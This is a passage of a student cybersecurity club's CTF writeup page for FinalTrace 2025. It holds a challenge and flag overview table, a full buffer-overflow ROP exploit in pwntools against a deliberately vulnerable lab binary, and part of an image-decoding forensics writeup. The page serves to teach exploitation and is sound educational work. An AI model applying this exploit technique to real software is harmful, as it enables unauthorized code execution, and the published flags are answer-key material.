<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="FinalTrace 2025" /><meta property="og:locale" content="en" /><meta name="description" content="A set of CTF writeups and tutorials" /><meta property="og:description" content="A set of CTF writeups and tutorials" /><link rel="canonical" href="https://writeups.cyscomvit.com/writeups/FinalTrace_2025/" /><meta property="og:url" content="https://writeups.cyscomvit.com/writeups/FinalTrace_2025/" /><meta property="og:site_name" content="Cyscom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-10-31T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="FinalTrace 2025" /><meta name="twitter:site" content="@CyscomVit" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-12-17T21:02:33+05:30","datePublished":"2025-10-31T00:00:00+05:30","description":"A set of CTF writeups and tutorials","headline":"FinalTrace 2025","mainEntityOfPage":{"@type":"WebPage","@id":"https://writeups.cyscomvit.com/writeups/FinalTrace_2025/"},"url":"https://writeups.cyscomvit.com/writeups/FinalTrace_2025/"}</script><title> Cyscom | FinalTrace 2025</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Cyscom"><meta name="application-name" content="Cyscom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/cyscom-logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Cyscom</a></div><div class="site-subtitle font-italic">Cybersecurity Student Community of VIT Chennai</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>CTF EVENTS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/posts/" class="nav-link"> <i class="fa-fw fas fa-pencil ml-xl-3 mr-xl-3 unloaded"></i> <span>POSTS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/cyscomvit" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/CyscomVit" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="https://www.instagram.com/cyscomvit/" aria-label="instagram" target="_blank" rel="noopener noreferrer" > <i class="fab fa-instagram"></i> </a> <a href="mailto:cyscom@vit.ac.in" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/company/cyscomvit/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>FinalTrace 2025</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Ctf-event</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1> FinalTrace 2025</h1><p>Writeups for FinalTrace 2025 CTF.</p><div class="post-content"><h1>Overview</h1><div class="table-wrapper"><div class="table-wrapper"><table><thead><tr><th>Challenge<th>Difficulty<th>Points<th>Category<th>Flag<tbody><tr><td><a href="#door-s-mechanism">Door's Mechanism</a><td>Medium<td>500<td>Pwn<td><code>CYS{7h3_l45t_1nv0ca710n_ha5_b33n_5p0k3n_@789#!}</code><tr><td><a href="#echo-in-black-white">Echo in Black & White</a><td>Medium<td>500<td>Forensics<td><code>CYS{7H3_H1DD3N_L4Y3R}</code><tr><td><a href="#do-you-know-xor-well-enough">Do you know XOR well enough?</a><td>Medium<td>500<td>General<td><code>Dynamic Flag</code><tr><td><a href="#alpha-parallel">Alpha Parallel</a><td>Easy<td>500<td>Forensics / Cryptography<td><code>CYS{SHADOW_ALPHA_QR_LAYER_42X}</code><tr><td><a href="#the-door-s-mechanism">The Door's Mechanism</a><td>Medium<td>500<td>pwn<td><code>Dynamic Flag</code><tr><td><a href="#aes-again">AES again??</a><td>Medium<td>500<td>General<td><code>CYS{tiny_change_huge_difference}</code><tr><td><a href="#vault-7a">VAULT_7A</a><td>Medium<td>500<td>General<td><code>FLAG{ECHO_VAULT_MEMORY_FRAGMENT_7A_RESTORED}</code><tr><td><a href="#forged-memory-log">Forged Memory Log</a><td>Medium<td>500<td>General<td><code>CYS{brute_forcing_is_the_way}</code><tr><td><a href="#reflection-restored">Reflection Restored</a><td>Medium<td>500<td>General<td><code>CYS{r3fl3ct10n_r3st0r3d_B2A}</code><tr><td><a href="#temporal-core-console">Temporal Core Console</a><td>Medium<td>500<td>General<td><code>CYS{E0N_SYNCHRONIZED_2F3C}</code><tr><td><a href="#the-watcher-s-gaze">The Watcher's Gaze</a><td>Medium<td>500<td>OSINT<td><code>CYS{341184_125001_6B011D}</code><tr><td><a href="#challenge-name-exif-echoes">Challenge Name - EXIF ECHOES</a><td>Medium<td>500<td>Forensics/OSint<td><code>CYS{T1m3_Fr4gm3nt5_R3v34l_Th3_P4th}</code><tr><td><a href="#sneaky-notes">Sneaky Notes</a><td>Medium<td>500<td>Web<td><code>CYS{sneaky_notes_xss}</code><tr><td><a href="#eon-gate">EON GATE</a><td>Medium<td>500<td>Web<td><code>CYS{EON_REALIGNED}</code><tr><td><a href="#mirror-shatter">Mirror Shatter</a><td>Medium<td>500<td>Web<td><code>CYS{B43aking_th3_m1rr0r_1$_c00l}</code><tr><td><a href="#echoes-in-the-hourglass">Echoes in the Hourglass</a><td>Medium<td>500<td>General<td><code>FLAG{HOURGLASS_RECOVERED}</code><tr><td><a href="#temporal-freeze-upgrade">Temporal Freeze Upgrade</a><td>Medium<td>500<td>General<td><code>cys{T1M3_SYNC}</code><tr><td><a href="#lyra-s-photos">Lyra's Photos</a><td>Medium<td>500<td>Forensics<td><code>CYS{f1v3_53n535_s1x_3m0t10n5}</code><tr><td><a href="#paradox-gate-gaurdian">PARADOX GATE GAURDIAN</a><td>Medium<td>500<td>Crypto<td><code>CYS{4CC355_6RAN73D}</code><tr><td><a href="#where-do-u-came-from">Where do u came from</a><td>Medium<td>500<td>Pwn<td><code>Dynamic Flag</code><tr><td><a href="#symphony-of-loops">Symphony of Loops</a><td>Medium<td>500<td>Musical Cipher<td><code>CYS{K3V1N_DUR4NT_M1DD13_G4M3}</code><tr><td><a href="#ashes-of-memory">Ashes of Memory</a><td>Medium<td>500<td>Forensics<td><code>CYS{7h3RE_15_N0_E4D}</code><tr><td><a href="#lost-core-pulse">Lost Core Pulse</a><td>Medium<td>500<td>General<td><code>CYS{3bb12d_lostpulse_91be2d}</code><tr><td><a href="#spectogram-shadows">Spectogram Shadows</a><td>Medium<td>500<td>General<td><code>cys{N9OO22_ESOO7S}</code><tr><td><a href="#poem-of-hidden-lies">POEM OF HIDDEN LIES</a><td>Medium<td>500<td>OSInt/Forensics/Text<td><code>CYS{january_2019}</code><tr><td><a href="#mirror-of-minutes">Mirror of Minutes</a><td>Medium<td>500<td>General<td><code>cys{m1rr0r_p4ss}</code><tr><td><a href="#feed-it-the-fracture">Feed It the Fracture</a><td>Medium<td>500<td>Forensics (E)<td><code>CYS{INH4RM0N1C_DO0R_UNL0CK3D}</code><tr><td><a href="#phantom-fingerprints">Phantom Fingerprints</a><td>Medium<td>500<td>Forensics<td><code>CYS{ph4n7om_v3n0m}</code><tr><td><a href="#to-hehe-with-lyra-s-echoes">To Hehe with Lyra's Echoes</a><td>Medium<td>500<td>General<td><code>CYS{HERACTUALECHOES}</code><tr><td><a href="#shattered-glass-logs">Shattered Glass Logs</a><td>Medium<td>500<td>Forensics<td><code>CYS{gl4ss_un5h4tt3rd}</code><tr><td><a href="#the-infinite-gate">The Infinite Gate</a><td>Medium<td>500<td>Web<td><code>CYS{c00k1eS_ar3_m34nt_t0_b3_br0k3n}</code><tr><td><a href="#auditor-s-diary">Auditor's Diary</a><td>Medium<td>500<td>OSINT/TEXT<td><code>CYS{olofkgustafsson}</code><tr><td><a href="#reconfiguration-terminal">Reconfiguration Terminal</a><td>Medium<td>500<td>General<td><code>CYS{7h3_h0ur6l455_5h4773r3d_bu7_m3m0ry_r3m41n5_1n_fr46m3n75_pl3453_l1573n_cl053r_65537_2025}</code><tr><td><a href="#paradox-parable">Paradox Parable</a><td>Medium<td>500<td>General<td><code>CYS{early_belief}</code><tr><td><a href="#temporal-mergepoint">Temporal Mergepoint</a><td>Medium<td>500<td>General<td><code>CYS{temporal_merge_success}</code><tr><td><a href="#maelle-confrontation">Maelle Confrontation</a><td>Medium<td>500<td>OSINT<td><code>CYS{d3nyy}</code><tr><td><a href="#auditor-encounter">Auditor Encounter</a><td>Medium<td>500<td>Web / ARG<td><code>CYS{aud1t_regr3t_pass}</code><tr><td><a href="#citadel-entry-lock">Citadel Entry Lock</a><td>Medium<td>500<td>General<td><code>CYS{SEAL_RAID_CROSS_MAAT_MAZE_HODOS}</code><tr><td><a href="#choir-echoes">Choir Echoes</a><td>Medium<td>500<td>Forensics<td><code>CYS{1tal1an0}</code><tr><td><a href="#reflection-logs">Reflection Logs</a><td>Medium<td>500<td>Forensics<td><code>CYS{lyra_was_here}</code><tr><td><a href="#auditor-encounter">Auditor Encounter</a><td>Medium<td>500<td>Web / ARG<td><code>CYS{audit_recovered_1A3F_07XZ}</code><tr><td><a href="#cryptoez">CryptoEZ</a><td>Medium<td>500<td>General<td><code>CYS{y0u_kn0w_cryp70}</code><tr><td><a href="#lyra-s-journal">Lyra's Journal</a><td>Medium<td>500<td>Forensics<td><code>CYS{THE_CLOCKS_WERE_LYING}</code><tr><td><a href="#echo-double-combat">Echo-Double Combat</a><td>Medium<td>500<td>Reverse Engineering<td><code>cys{s3cr3t_1s_un10cked}</code></table></div></div><h1 id="door-s-mechanism"> Door's Mechanism <a href="/writeups/FinalTrace_2025/01-doors-mechanism.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="doors-mechanism">Door’s Mechanism</h1><blockquote><p>Author: Naresh</p><ul><li><strong>Category</strong>: Pwn</ul></blockquote><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote><p>Legends speak of a single spell that can unseal the ancient chamber. With one utterance, perform the invocation and witness what was meant to stay hidden.</p></blockquote><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First, run <code class="language-plaintext highlighter-rouge">file</code> on the binary (<code class="language-plaintext highlighter-rouge">Last-Invocation</code>) to confirm it is a 64-bit ELF.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file Last-Invocation
Last-Invocation: ELF 64-bit LSB executable, ...
</pre></table></code></div></div><p>Next, run <code class="language-plaintext highlighter-rouge">checksec</code> to see what protections were enabled.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>checksec Last-Invocation
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'Last-Invocation'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    RWX:      Has RWX segments
</pre></table></code></div></div><blockquote><p>No PIE indicates that the function addresses will be static.</p></blockquote><p>Running the binary and giving it a long string of ‘A’s causes a Segmentation fault, confirming the buffer overflow.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>pwntools: For building and sending the exploit payload.<li>gdb (with pwndbg): For finding the offset and function addresses.<li>Ghidra: For static analysis and decompilation.<li>ropper: For finding the ROP gadgets.<li>checksec: For checking binary protections.<h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-finding-the-vulnerability-and-offset"><span class="mr-2">Step 1: Finding the Vulnerability and Offset</span><a href="#step-1-finding-the-vulnerability-and-offset" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Open the binary in GDB (with pwndbg) and use a cyclic(100) pattern to find the exact offset to control the return address.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>gdb-pwndbg&gt; r
...
Speak the Invocation:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
...
Program received signal SIGSEGV, Segmentation fault.
... 
gdb-pwndbg&gt; cyclic <span class="nt">-l</span> daaaaaaa
24
</pre></table></code></div></div><p>The offset to overwrite the return address is 24 bytes.</p><h4 id="step-2-planning-the-rop-chain"><span class="mr-2">Step 2: Planning the ROP Chain</span><a href="#step-2-planning-the-rop-chain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The goal is to return to the <code class="language-plaintext highlighter-rouge">unseal_chamber</code> function, which will print the flag. This function can be easily found by decompiling the binary in Ghidra or by using gdb.</p></ul><p>To call it successfully, it requires two specific 64-bit integers as arguments:</p><ul><li><code class="language-plaintext highlighter-rouge">$rdi</code>(first argument) = <code class="language-plaintext highlighter-rouge">0xdeadc0dedeadc0de</code><li><code class="language-plaintext highlighter-rouge">$rsi</code> (second argument) = <code class="language-plaintext highlighter-rouge">0xc05c0377c05c0377</code></ul><p>Use <code class="language-plaintext highlighter-rouge">ropper</code> to find the necessary ROP gadgets:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ropper <span class="nt">--file</span> Last-Invocation <span class="nt">--search</span> <span class="s2">"pop rdi; ret"</span>
...
0x000000000040119a: pop rdi<span class="p">;</span> ret<span class="p">;</span> 

<span class="nv">$ </span>ropper <span class="nt">--file</span> Last-Invocation <span class="nt">--search</span> <span class="s2">"pop rsi; pop r15; ret"</span>
...
0x000000000040119c: pop rsi<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span>
</pre></table></code></div></div><p>Use <code class="language-plaintext highlighter-rouge">gdb</code> to find the function address.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>gdb-pwndbg&gt; p unseal_chamber
<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>void <span class="o">(</span>long, long<span class="o">))</span> 0x4011a3 &lt;unseal_chamber&gt;
</pre></table></code></div></div><p>The final ROP chain should look like this:</p><ul><li>Padding: 24 bytes of junk (to fill the buffer)<li>Gadget 1: Address of <code class="language-plaintext highlighter-rouge">pop rdi; ret</code><li>Argument 1: <code class="language-plaintext highlighter-rouge">0xdeadc0dedeadc0de</code><li>Gadget 2: Address of <code class="language-plaintext highlighter-rouge">pop rsi; pop r15; ret</code><li>Argument 2: <code class="language-plaintext highlighter-rouge">0xc05c0377c05c0377</code><li>Argument 3: 8 bytes of junk (for pop r15)<li>Target: Address of <code class="language-plaintext highlighter-rouge">unseal_chamber</code></ul><h4 id="step-3-final-exploit-script"><span class="mr-2">Step 3: Final Exploit Script</span><a href="#step-3-final-exploit-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Write a final exploit script using pwntools to automate this process.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">24</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040119a</span>
<span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x000000000040119c</span>
<span class="n">param1</span> <span class="o">=</span> <span class="mh">0xdeadc0dedeadc0de</span>
<span class="n">param2</span> <span class="o">=</span> <span class="mh">0xc05c0377c05c0377</span>
<span class="n">unseal_chamber</span> <span class="o">=</span> <span class="mh">0x00000000004011a3</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">target_host</span><span class="sh">"</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">param1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">param2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">unseal_chamber</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Running this script against the binary will call the function with the correct arguments and print the flag.</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p>CYS{7h3<em>l45t_1nv0ca710n_ha5_b33n_5p0k3n</em>@789#!}</p></blockquote><h2> Flag</h2><code> CYS{7h3_l45t_1nv0ca710n_ha5_b33n_5p0k3n_@789#!} </code><hr><h1 id="echo-in-black-white"> Echo in Black & White <a href="/writeups/FinalTrace_2025/02-echo-in-black-white.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="echo-in-black--white">Echo in Black &amp; White</h1><h2 id="challenge-information"><span class="mr-2">Challenge Information</span><a href="#challenge-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Title</strong>: Echo in Black &amp; White<li><strong>Category</strong>: Forensics<li><strong>Difficulty</strong>: Easy–Medium</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What if complexity is just an illusion? Sometimes, the most ordinary patterns hold extraordinary secrets — if you learn to see them differently. The challenge is about observing the given image carefully — it may look random, but it hides a binary pattern where black represents 1 and white represents 0. Instead of overcomplicating it, try to read the pattern as bits, group them properly, and see what message it reveals. Sometimes, the simplest patterns lead you straight to the flag.</p><h2 id="hint"><span class="mr-2">Hint</span><a href="#hint" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>the grid is 16*10 bits</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The challenge image looked like a small QR-like binary grid.<br /> Since the description mentioned interpreting colors as binary bits, the first idea was to treat each black pixel as <strong>1</strong> and each white pixel as <strong>0</strong>, then group them to extract ASCII text.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong>Python</strong><li><strong>Pillow (PIL)</strong> – for reading and resizing the image<li><strong>NumPy</strong> – for pixel manipulation</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-load-and-convert-the-image"><span class="mr-2">Step 1: Load and Convert the Image</span><a href="#step-1-load-and-convert-the-image" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span> <span class="n">numpy</span> <span class="k">as</span> <span class="n">np</span>

<span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">download.png</span><span class="sh">"</span><span class="p">).</span><span class="nf">convert</span><span class="p">(</span><span class="sh">"</span><span class="s">L</span><span class="sh">"</span><span class="p">)</span>
<span class="n">binary_img</span> <span class="o">=</span> <span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">(</span><span class="n">img</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">).</span><span class="nf">astype</span><span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="n">uint8</span><span class="p">)</span>  <span class="c1"># Black = 1, White = 0
</span></pre></table></code></div></div><p>This converts the image to grayscale, then thresholds it so that each pixel is either 1 or 0.</p><h4 id="step-2-resize-to-match-the-hint-dimensions"><span class="mr-2">Step 2: Resize to Match the Hint Dimensions</span><a href="#step-2-resize-to-match-the-hint-dimensions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">resized</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">(</span><span class="n">Image</span><span class="p">.</span><span class="nf">fromarray</span><span class="p">(</span><span class="n">binary_img</span> <span class="o">*</span> <span class="mi">255</span><span class="p">).</span><span class="nf">resize</span><span class="p">((</span><span class="mi">16</span><span class="p">,</span> <span class="mi">10</span><span class="p">),</span> <span class="n">Image</span><span class="p">.</span><span class="n">NEAREST</span><span class="p">))</span>
<span class="n">resized</span> <span class="o">=</span> <span class="p">(</span><span class="n">resized</span> <span class="o">&gt;</span> <span class="mi">128</span><span class="p">).</span><span class="nf">astype</span><span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="n">uint8</span><span class="p">)</span>
</pre></table></code></div></div><p>According to the challenge hint, the grid has <strong>16 columns</strong> and <strong>10 rows</strong>, so we resize it to that exact shape.</p><h4 id="step-3-extract-binary-and-convert-to-ascii"><span class="mr-2">Step 3: Extract Binary and Convert to ASCII</span><a href="#step-3-extract-binary-and-convert-to-ascii" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">ascii_text</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">resized</span><span class="p">:</span>
    <span class="n">bits</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">row</span><span class="p">))</span>
    <span class="n">byte1</span><span class="p">,</span> <span class="n">byte2</span> <span class="o">=</span> <span class="n">bits</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="n">bits</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
    <span class="n">ascii_text</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">byte1</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">byte2</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>

<span class="nf">print</span><span class="p">(</span><span class="n">ascii_text</span><span class="p">)</span>
